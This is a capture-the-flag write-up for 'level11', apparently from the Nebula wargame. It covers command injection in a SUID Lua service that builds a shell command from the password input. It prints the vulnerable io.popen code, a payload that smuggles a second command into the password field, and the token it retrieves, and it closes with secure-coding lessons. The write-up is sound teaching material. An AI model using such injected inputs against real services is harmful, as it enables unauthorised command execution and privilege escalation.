# level11

## Goal

Retrieve the token for the next level by exploiting a vulnerable Lua service running with elevated privileges.

---

## Recon

List files:

```bash
ls -al
```

Output:

```text
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

The script is executed with the privileges of `flag11`.

Trying to execute it manually:

```bash
./level11.lua
```

returns:

```text
address already in use
```

which indicates that a service is already running.

Connect to the service:

```bash
nc localhost 5151
```

The service prompts for a password.

---

## Source Code Analysis

Relevant function:

```lua
function hash(pass)
    prog = io.popen("echo "..pass.." | sha1sum", "r")
    data = prog:read("*all")
    prog:close()

    data = string.sub(data, 1, 40)

    return data
end
```

User input is concatenated directly into a shell command without any sanitization.

Constructed command:

```bash
echo <user_input> | sha1sum
```

This is a classic command injection vulnerability.

---

## Vulnerability

**Command Injection**

The application uses:

```lua
io.popen("echo "..pass.." | sha1sum", "r")
```

instead of safely escaping or validating the user input.

An attacker can inject arbitrary shell commands using shell separators such as:

```text
;
&&
||
```

or other shell features.

---

## Exploitation

Inject a second command and redirect its output into a writable file:

```text
x; getflag >/tmp/test
```

The executed command becomes:

```bash
echo x; getflag >/tmp/test | sha1sum
```

Although the service still replies:

```text
Erf nope..
```

the injected command is executed with the privileges of `flag11`.

Read the generated file:

```bash
cat /tmp/test
```

Output:

```text
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Use the retrieved token to access the next level.

---

## Why It Works

`io.popen()` invokes a shell to execute the provided command.

Because the user input is concatenated directly into the command string, shell metacharacters are interpreted instead of being treated as plain text.

This allows arbitrary command execution with the privileges of the SUID program.

---

## Security Lessons

* Never concatenate user input into shell commands.
* Avoid using `system()`, `popen()`, or equivalent functions with unsanitized input.
* Prefer native library functions instead of invoking external programs.
* If shell execution is unavoidable, properly escape or validate every user-controlled parameter.

---

## Useful Commands

Connect to the service:

```bash
nc localhost 5151
```

Exploit:

```text
x; getflag >/tmp/test
```

Read the output:

```bash
cat /tmp/test
```

---

## Vulnerability Category

* Command Injection (CWE-77)
* Improper Neutralization of Special Elements used in a Command
